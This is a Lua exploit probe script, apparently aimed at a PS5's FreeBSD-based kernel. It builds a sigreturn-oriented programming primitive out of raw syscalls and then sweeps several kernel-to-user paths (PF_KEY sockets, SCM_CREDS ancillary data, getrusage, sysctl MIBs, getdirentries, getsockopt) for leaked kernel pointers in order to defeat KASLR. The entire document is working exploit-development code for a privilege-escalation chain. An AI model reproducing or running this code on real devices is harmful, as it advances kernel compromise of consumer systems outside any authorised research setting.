-- CRASH_CLASS: LOW
-- PROBE 168a: Multi-vector KASLR search
--
-- Try every remaining kernel-to-user data path for uninitialized bytes:
-- A) PF_KEY socket (related to CVE-2026-3038 sa_len overflow family)
-- B) AF_UNIX SCM_CREDS ancillary data (padding in cmsgcred struct)
-- C) getrusage(RUSAGE_SELF) struct padding
-- D) Unusual sysctl MIBs (kern.proc.args, kern.proc.pathname, etc.)
-- E) getdirentries on /dev (inode numbers, d_reclen padding)
-- F) SO_ACCEPTFILTER / getsockopt probing
-- G) clock_getres for exotic clock IDs

print("=== PROBE 168a: MULTI-VECTOR KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x800000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local function pack4(b0, b1, b2, b3)
    return b0 + b1 * 256 + b2 * 65536 + b3 * 16777216
end

local function scan_kptrs(base_off, len, label)
    local kp = 0
    for off = 0, len - 8, 8 do
        local val = rq(gpu + base_off + off)
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            kp = kp + 1
            if kp <= 5 then
                print("  " .. label .. " KPTR +" ..
                    string.format("%04X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
    end
    return kp
end

-- [A] PF_KEY socket
print("--- [A] PF_KEY SOCKET ---")
-- PF_KEY=15, SOCK_RAW=3, PF_KEY_V2=2
local pfk = srop(97, uint64(15), uint64(3), uint64(2))
local pfkv = pfk and to_num(pfk) or -1
print("pf_key_socket=" .. pfkv)
if pfkv >= 0 then
    -- Try SADB_DUMP to get SA database
    local SADB_OFF = 0x60000
    for off = 0, 0xFF, 4 do wd(gpu + SADB_OFF + off, 0) end
    -- sadb_msg header: version=2, type=SADB_DUMP=10, satype=SADB_SATYPE_ESP=3
    wd(gpu + SADB_OFF, pack4(2, 10, 0, 3))
    wd(gpu + SADB_OFF + 4, pack4(2, 0, 0, 0))  -- len=2 (in 8-byte units = 16 bytes)
    wd(gpu + SADB_OFF + 8, 0)
    wd(gpu + SADB_OFF + 12, pid % 65536 + math.floor(pid / 65536) * 65536)

    local wr = srop(4, uint64(pfkv), ga(SADB_OFF), uint64(16))
    print("  sadb_dump write=" .. (wr and to_num(wr) or -999))

    -- Try to read response
    local SADB_RESP = 0x61000
    for off = 0, 0x3FF, 4 do wd(gpu + SADB_RESP + off, 0) end
    local rr = srop(3, uint64(pfkv), ga(SADB_RESP), uint64(0x400))
    local rrv = rr and to_num(rr) or -999
    print("  sadb_dump read=" .. rrv)
    if rrv > 0 then
        local kp = scan_kptrs(SADB_RESP, rrv, "SADB")
        print("  sadb_kptrs=" .. kp)
    end

    srop(6, uint64(pfkv))
else
    print("  PF_KEY socket failed (expected on PS5)")
end

-- [B] AF_UNIX SCM_CREDS
print("")
print("--- [B] AF_UNIX SCM_CREDS ---")
-- Create socketpair
local SP_OFF = 0x62000
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(SP_OFF))
local spv = sp and to_num(sp) or -999
print("socketpair=" .. spv)

if spv == 0 then
    local fd0 = rd(gpu + SP_OFF)
    local fd1 = rd(gpu + SP_OFF + 4)
    print("fds=" .. fd0 .. "," .. fd1)

    -- Set LOCAL_CREDS on fd1 (receiver)
    -- SOL_LOCAL=0 on FreeBSD, LOCAL_CREDS=2
    -- Actually SOL_LOCAL is 0 on FreeBSD
    -- setsockopt(fd1, 0, LOCAL_CREDS=2, &one, 4)
    local OPT_OFF = 0x63000
    wd(gpu + OPT_OFF, 1)
    local so = srop(105, uint64(fd1), uint64(0), uint64(2),
        ga(OPT_OFF), uint64(4))
    print("setsockopt(LOCAL_CREDS)=" .. (so and to_num(so) or -999))

    -- Also try LOCAL_PEERCRED=1
    local so2 = srop(105, uint64(fd1), uint64(0), uint64(1),
        ga(OPT_OFF), uint64(4))
    print("setsockopt(LOCAL_PEERCRED)=" .. (so2 and to_num(so2) or -999))

    -- Send a message from fd0
    local SDATA = 0x64000
    wd(gpu + SDATA, 0x41424344)  -- "ABCD"
    local IOV_S = 0x64100
    wq(gpu + IOV_S, ga(SDATA))
    wq(gpu + IOV_S + 8, uint64(4))
    local SMSG = 0x64200
    for off = 0, 0x3F, 4 do wd(gpu + SMSG + off, 0) end
    wq(gpu + SMSG + 16, ga(IOV_S))  -- msg_iov
    wd(gpu + SMSG + 24, 1)          -- msg_iovlen

    local sw = srop(28, uint64(fd0), ga(SMSG), uint64(0))
    print("sendmsg=" .. (sw and to_num(sw) or -999))

    -- Receive with ancillary data buffer
    local RDATA = 0x65000
    local IOV_R = 0x65100
    wq(gpu + IOV_R, ga(RDATA))
    wq(gpu + IOV_R + 8, uint64(256))
    local RMSG = 0x65200
    for off = 0, 0x3F, 4 do wd(gpu + RMSG + off, 0) end
    wq(gpu + RMSG + 16, ga(IOV_R))     -- msg_iov
    wd(gpu + RMSG + 24, 1)              -- msg_iovlen
    local CTRL = 0x66000
    for off = 0, 0x1FF, 4 do wd(gpu + CTRL + off, 0) end
    wq(gpu + RMSG + 0, ga(CTRL))       -- msg_control (FreeBSD: +0)
    -- Wait, FreeBSD msghdr layout:
    -- +0x00: msg_name (ptr)
    -- +0x08: msg_namelen (socklen_t, 4 bytes + pad)
    -- +0x10: msg_iov (ptr)
    -- +0x18: msg_iovlen (int + pad)
    -- +0x20: msg_control (ptr)
    -- +0x28: msg_controllen (socklen_t + pad)
    -- +0x30: msg_flags (int)
    wq(gpu + RMSG + 0x20, ga(CTRL))    -- msg_control
    wd(gpu + RMSG + 0x28, 0x200)        -- msg_controllen

    local rr = srop(27, uint64(fd1), ga(RMSG), uint64(0))
    local rrv = rr and to_num(rr) or -999
    print("recvmsg=" .. rrv)

    if rrv >= 0 then
        local ctrl_len = rd(gpu + RMSG + 0x28)
        local flags = rd(gpu + RMSG + 0x30)
        print("msg_controllen=" .. ctrl_len .. " flags=0x" ..
            string.format("%X", flags))

        if ctrl_len > 0 then
            -- Parse cmsghdr: cmsg_len (4/8), cmsg_level, cmsg_type
            local cmsg_len = rd(gpu + CTRL)
            local cmsg_level = rd(gpu + CTRL + 4) -- might be at +8 on 64-bit
            local cmsg_type = rd(gpu + CTRL + 8)
            print("cmsg: len=" .. cmsg_len .. " level=" .. cmsg_level ..
                " type=" .. cmsg_type)

            -- Dump all control data
            print("control data (" .. ctrl_len .. " bytes):")
            for off = 0, math.min(ctrl_len - 4, 0x100), 4 do
                local v = rd(gpu + CTRL + off)
                if v ~= 0 then
                    print("  +" .. string.format("%02X", off) ..
                        "=0x" .. string.format("%08X", v))
                end
            end

            -- Scan for kernel pointers
            local kp = scan_kptrs(CTRL, ctrl_len, "CREDS")
            print("creds_kptrs=" .. kp)
        end
    end

    srop(6, uint64(fd0))
    srop(6, uint64(fd1))
end

-- [C] getrusage
print("")
print("--- [C] GETRUSAGE ---")
-- getrusage(RUSAGE_SELF=0, &usage)
-- struct rusage is 144 bytes on FreeBSD amd64
local RU_OFF = 0x70000
for off = 0, 0xFF, 4 do wd(gpu + RU_OFF + off, 0) end
local ru = srop(117, uint64(0), ga(RU_OFF))
print("getrusage(SELF)=" .. (ru and to_num(ru) or -999))

if ru and to_num(ru) == 0 then
    -- Dump full rusage struct (144 bytes)
    print("rusage dump:")
    local ru_nonzero = 0
    for off = 0, 0x8C, 8 do
        local val = rq(gpu + RU_OFF + off)
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then
            ru_nonzero = ru_nonzero + 1
            print("  +" .. string.format("%02X", off) ..
                "=0x" .. string.format("%X%08X", vh, vl))
        end
    end
    local kp = scan_kptrs(RU_OFF, 144, "RUSAGE")
    print("rusage_kptrs=" .. kp)

    -- Also try RUSAGE_CHILDREN=(-1)
    for off = 0, 0xFF, 4 do wd(gpu + RU_OFF + off, 0) end
    ru = srop(117, uint64("0xFFFFFFFFFFFFFFFF"), ga(RU_OFF))
    print("getrusage(CHILDREN)=" .. (ru and to_num(ru) or -999))
    if ru and to_num(ru) == 0 then
        kp = scan_kptrs(RU_OFF, 144, "RUSAGE_C")
        print("rusage_children_kptrs=" .. kp)
    end
end

-- [D] Unusual sysctl MIBs
print("")
print("--- [D] SYSCTL PROBES ---")

local MIB_OFF = 0x80000
local SOUT_OFF = 0x81000
local SLEN_OFF = 0x80F00

local function try_sysctl(name, mib_vals, mib_len)
    for off = 0, 0x1F, 4 do wd(gpu + MIB_OFF + off, 0) end
    for i, v in ipairs(mib_vals) do
        wd(gpu + MIB_OFF + (i - 1) * 4, v)
    end
    for off = 0, 0xFFF, 4 do wd(gpu + SOUT_OFF + off, 0) end
    wd(gpu + SLEN_OFF, 0x1000)
    wd(gpu + SLEN_OFF + 4, 0)

    local rv = srop(202, ga(MIB_OFF), uint64(mib_len), ga(SOUT_OFF),
        ga(SLEN_OFF), uint64(0), uint64(0))
    local rvv = rv and to_num(rv) or -999
    local actual = rd(gpu + SLEN_OFF)

    if rvv == 0 and actual > 0 then
        local kp = scan_kptrs(SOUT_OFF, math.min(actual, 0x1000), name)
        print(name .. ": rv=0 len=" .. actual .. " kptrs=" .. kp)
        return actual
    else
        print(name .. ": rv=" .. rvv .. " len=" .. actual)
        return 0
    end
end

-- kern.proc.pathname (CTL_KERN=1, KERN_PROC=14, KERN_PROC_PATHNAME=12, pid)
try_sysctl("kern.proc.pathname", {1, 14, 12, pid}, 4)

-- kern.proc.vmmap (CTL_KERN=1, KERN_PROC=14, KERN_PROC_VMMAP=32, pid)
try_sysctl("kern.proc.vmmap", {1, 14, 32, pid}, 4)

-- kern.proc.groups (CTL_KERN=1, KERN_PROC=14, KERN_PROC_GROUPS=36, pid)
try_sysctl("kern.proc.groups", {1, 14, 36, pid}, 4)

-- kern.proc.rlimit (CTL_KERN=1, KERN_PROC=14, KERN_PROC_RLIMIT=37, pid)
try_sysctl("kern.proc.rlimit", {1, 14, 37, pid}, 4)

-- kern.proc.umask (CTL_KERN=1, KERN_PROC=14, KERN_PROC_UMASK=39, pid)
try_sysctl("kern.proc.umask", {1, 14, 39, pid}, 4)

-- kern.proc.osrel (CTL_KERN=1, KERN_PROC=14, KERN_PROC_OSREL=40, pid)
try_sysctl("kern.proc.osrel", {1, 14, 40, pid}, 4)

-- kern.proc.sigtramp (CTL_KERN=1, KERN_PROC=14, KERN_PROC_SIGTRAMP=41, pid)
try_sysctl("kern.proc.sigtramp", {1, 14, 41, pid}, 4)

-- hw.pagesize (CTL_HW=6, HW_PAGESIZE=7)
try_sysctl("hw.pagesize", {6, 7}, 2)

-- hw.ncpu (CTL_HW=6, HW_NCPU=3)
try_sysctl("hw.ncpu", {6, 3}, 2)

-- hw.physmem (CTL_HW=6, HW_PHYSMEM=5)
try_sysctl("hw.physmem", {6, 5}, 2)

-- kern.boottime (CTL_KERN=1, KERN_BOOTTIME=21)
try_sysctl("kern.boottime", {1, 21}, 2)

-- kern.proc.auxv (CTL_KERN=1, KERN_PROC=14, KERN_PROC_AUXV=36... wait that's groups)
-- Actually KERN_PROC_AUXV = 16 on some FreeBSD
try_sysctl("kern.proc.auxv", {1, 14, 16, pid}, 4)

-- [E] getdirentries via SROP
print("")
print("--- [E] GETDIRENTRIES /dev ---")
-- open("/dev", O_RDONLY=0)
local DEV_PATH = 0x90000
wd(gpu + DEV_PATH, pack4(0x2F, 0x64, 0x65, 0x76))  -- "/dev"
wd(gpu + DEV_PATH + 4, 0)
local devfd = srop(5, ga(DEV_PATH), uint64(0))
local devfdv = devfd and to_num(devfd) or -1
print("open(/dev)=" .. devfdv)

if devfdv >= 0 then
    local DENT_OFF = 0x91000
    local BASEP_OFF = 0x90F00
    for off = 0, 0xFFF, 4 do wd(gpu + DENT_OFF + off, 0) end
    wq(gpu + BASEP_OFF, uint64(0))

    -- getdirentries(fd, buf, nbytes, basep)
    -- FreeBSD: sys 554 on newer, or sys 196 older
    -- PS5 uses 32-bit dirent (per CLAUDE.md)
    local de = srop(554, uint64(devfdv), ga(DENT_OFF), uint64(0x1000), ga(BASEP_OFF))
    local dev = de and to_num(de) or -999
    print("getdirentries=" .. dev)

    if dev > 0 then
        -- Parse directory entries and check for unusual inode numbers
        local pos = 0
        local count = 0
        while pos < dev and count < 30 do
            -- 32-bit dirent: d_fileno(4), d_reclen(2), d_type(1), d_namlen(1), d_name
            local d_fileno = rd(gpu + DENT_OFF + pos)
            local d2 = rd(gpu + DENT_OFF + pos + 4)
            local d_reclen = d2 % 65536
            local d_type = math.floor(d2 / 65536) % 256
            local d_namlen = math.floor(d2 / 16777216)
            if d_reclen == 0 then break end

            -- Read name (up to 16 chars)
            local name_bytes = {}
            for i = 0, math.min(d_namlen - 1, 15) do
                local b = math.floor(rd(gpu + DENT_OFF + pos + 8 + (i - i % 4)) /
                    (256 ^ (i % 4))) % 256
                if b > 0 then table.insert(name_bytes, string.char(b)) end
            end
            local name = table.concat(name_bytes)

            -- Check if inode looks like a kernel pointer
            if d_fileno >= 0x80000000 then
                print("  HIGH_INODE: " .. name .. " ino=0x" ..
                    string.format("%08X", d_fileno))
            end
            count = count + 1
            pos = pos + d_reclen
        end
        print("entries_read=" .. count)

        -- Check padding bytes in entries for kernel residue
        local kp = scan_kptrs(DENT_OFF, dev, "DIRENT")
        print("dirent_kptrs=" .. kp)
    end

    srop(6, uint64(devfdv))
end

-- [F] clock_getres for exotic clock IDs
print("")
print("--- [F] CLOCK_GETRES ---")
local TRES_OFF = 0xA0000
local clock_ids = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}
for _, cid in ipairs(clock_ids) do
    wd(gpu + TRES_OFF, 0)
    wd(gpu + TRES_OFF + 4, 0)
    wd(gpu + TRES_OFF + 8, 0)
    wd(gpu + TRES_OFF + 12, 0)
    local cr = srop(234, uint64(cid), ga(TRES_OFF))
    local crv = cr and to_num(cr) or -999
    if crv == 0 then
        local sec = rd(gpu + TRES_OFF)
        local nsec = rd(gpu + TRES_OFF + 8)
        print("  clock " .. cid .. ": res=" .. sec .. "s " .. nsec .. "ns")
    end
end

-- [G] getsockopt probing on a TCP socket
print("")
print("--- [G] GETSOCKOPT PROBE ---")
local tcpfd = srop(97, uint64(2), uint64(1), uint64(0))
local tcpfdv = tcpfd and to_num(tcpfd) or -1
print("tcp_socket=" .. tcpfdv)

if tcpfdv >= 0 then
    local GOPT_OFF = 0xB0000
    local GLEN_OFF = 0xB0F00

    -- SO_PEERCRED on TCP (SOL_SOCKET=0xFFFF, SO_PEERCRED... varies)
    -- On FreeBSD: LOCAL_PEERCRED=1 at SOL_LOCAL=0
    -- Try SOL_SOCKET=0xFFFF with various option numbers
    local opts = {
        {0xFFFF, 0x1001, "SO_DEBUG"},
        {0xFFFF, 0x1009, "SO_KEEPALIVE"},
        {0xFFFF, 0x1010, "SO_LINGER"},
        {0xFFFF, 0x100A, "SO_OOBINLINE"},
        {0xFFFF, 0x1005, "SO_DONTROUTE"},
        {0xFFFF, 0x1007, "SO_RCVBUF"},
        {0xFFFF, 0x1001, "SO_SNDBUF"},
        {0xFFFF, 0x100E, "SO_TIMESTAMP"},
        {0xFFFF, 0x1020, "SO_ACCEPTCONN"},
        {6, 1, "TCP_NODELAY"},
        {6, 32, "TCP_INFO"},
    }

    for _, o in ipairs(opts) do
        for off = 0, 0xFF, 4 do wd(gpu + GOPT_OFF + off, 0) end
        wd(gpu + GLEN_OFF, 256)
        local go = srop(118, uint64(tcpfdv), uint64(o[1]), uint64(o[2]),
            ga(GOPT_OFF), ga(GLEN_OFF))
        local gov = go and to_num(go) or -999
        if gov == 0 then
            local olen = rd(gpu + GLEN_OFF)
            local kp = 0
            if olen >= 8 then
                kp = scan_kptrs(GOPT_OFF, olen, o[3])
            end
            if kp > 0 or olen > 16 then
                print("  " .. o[3] .. ": len=" .. olen .. " kptrs=" .. kp)
            end
        end
    end

    -- TCP_INFO deep scan (236 bytes known, look at high offsets)
    for off = 0, 0xFF, 4 do wd(gpu + GOPT_OFF + off, 0) end
    wd(gpu + GLEN_OFF, 0x200)
    local ti = srop(118, uint64(tcpfdv), uint64(6), uint64(32),
        ga(GOPT_OFF), ga(GLEN_OFF))
    if ti and to_num(ti) == 0 then
        local tilen = rd(gpu + GLEN_OFF)
        print("TCP_INFO: len=" .. tilen)
        if tilen > 0 then
            local kp = scan_kptrs(GOPT_OFF, tilen, "TCPINFO")
            print("tcpinfo_kptrs=" .. kp)
            -- Dump all non-zero qwords
            for off = 0, tilen - 8, 8 do
                local val = rq(gpu + GOPT_OFF + off)
                local vh, vl = get_hi_lo(val)
                if vh >= 0x80000000 then
                    print("  +" .. string.format("%02X", off) ..
                        "=0x" .. string.format("%X%08X", vh, vl))
                end
            end
        end
    end

    srop(6, uint64(tcpfdv))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
